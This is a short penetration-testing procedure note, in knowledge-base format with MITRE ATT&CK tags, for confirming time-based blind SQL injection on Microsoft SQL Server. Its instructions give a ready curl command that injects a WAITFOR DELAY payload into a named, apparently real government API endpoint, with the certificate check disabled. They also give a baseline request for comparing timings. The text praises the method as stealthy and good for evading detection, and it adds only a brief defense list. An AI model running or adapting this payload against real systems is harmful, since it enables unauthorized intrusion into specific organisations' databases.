---
id: proc-uuid-4
tags:
  - sqli
  - blind
  - time-based
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/time-curl-sql-delay-test]]'
verified: false
platforms:
  - Web
  - Microsoft SQL Server
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.051Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQLi-with-Time-Based-Blind-Technique

## Summary

This procedure confirms SQL Injection vulnerability using a time-based blind method, where a delay function is injected to infer successful execution via response timing, useful when no direct output is visible.

## Description

For the TVA endpoint, this injects WAITFOR DELAY '0:0:10' into the parameter, causing a 10-second pause if the payload executes. This stealthy technique validates injection without data leakage, ideal for evading detection in blind scenarios with MSSQL.

## Requirements

1. Vulnerable endpoint confirmed via prior tests
2. Timing measurement tool like 'time' command
3. Insecure SSL handling if certificate issues arise (-k flag)

## Defense

Defensive measures and detection strategies:

- Limit query execution time at the database level
- Monitor for prolonged request times in logs
- Use query whitelisting to block delay functions

## Objectives

1. Verify blind SQLi without visible errors
2. Confirm payload execution in non-verbose environments
3. Assess vulnerability persistence

## Instructions

### Step 1: Execute Time-Based Payload

**Context**: Send the delay payload and measure response time to detect injection success.

**Command** ([[commands/time-curl-sql-delay-test]]):

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
```

> The -k flag skips SSL verification, and the payload -GVDA1'+WAITFOR+DELAY+'0:0:10'--+- introduces a 10-second delay. Expected output: 'real' time in output shows ~10+ seconds elapsed.

### Step 2: Validate Delay

**Context**: Compare execution time against a baseline non-injected request.

Run a normal request for comparison:

```bash
time curl "https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1"
```

> Baseline should be quick (<1s); delay confirms vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/time-curl-sql-delay-test]]

## Tools Used

- [[tools/curl]]
- [[tools/time]]

## Tags

- blind-sqli
- timing-attack
